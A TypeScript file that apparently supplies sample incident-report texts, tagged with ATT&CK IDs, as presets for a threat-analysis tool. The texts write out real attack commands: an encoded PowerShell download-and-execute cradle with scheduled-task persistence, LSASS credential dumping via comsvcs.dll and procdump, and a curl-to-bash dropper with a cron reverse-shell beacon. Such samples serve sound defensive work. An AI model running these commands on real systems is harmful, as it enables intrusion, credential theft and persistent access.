export interface ThreatPreset {
  id: string;
  label: string;
  tag: string;
  description: string;
  rawText: string;
}

export const THREAT_PRESETS: ThreatPreset[] = [
  {
    id: "powershell-schtasks",
    label: "PowerShell Encoded Execution",
    tag: "Windows • T1059.001 / T1053.005",
    description: "Encoded PowerShell payload drop + scheduled task persistence",
    rawText:
      "During incident response, threat actors executed powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== to download and stage a secondary binary in C:\\Users\\Public\\AppData\\Local\\Temp\\updater.exe. Persistence was immediately established via schtasks.exe /Create /TN \"SystemHealthUpdater\" /TR \"C:\\Users\\Public\\AppData\\Local\\Temp\\updater.exe\" /SC ONLOGON /RL HIGHEST.",
  },
  {
    id: "lsass-dump",
    label: "LSASS Credential Dumping",
    tag: "Windows • T1003.001",
    description: "comsvcs.dll MiniDump & procdump targeting lsass.exe memory",
    rawText:
      "Post-exploitation telemetry revealed operators dumping credentials from LSASS process memory. The adversary invoked rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.dmp full from an interactive cmd.exe shell, followed by procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp to harvest NTLM hashes.",
  },
  {
    id: "linux-cron",
    label: "Linux Cron Persistence",
    tag: "Linux • T1053.003 / T1059.004",
    description: "curl | bash dropper writing unauthorized /etc/cron.d job",
    rawText:
      "Initial access on Ubuntu servers involved a web shell spawning /bin/bash -c \"curl -fsSL http://198.51.100.42/init.sh | bash\". The dropper appended a reverse-shell beacon to /etc/cron.d/sys_metrics and pulled a staging script into /tmp/.kworker using wget -qO-.",
  },
];
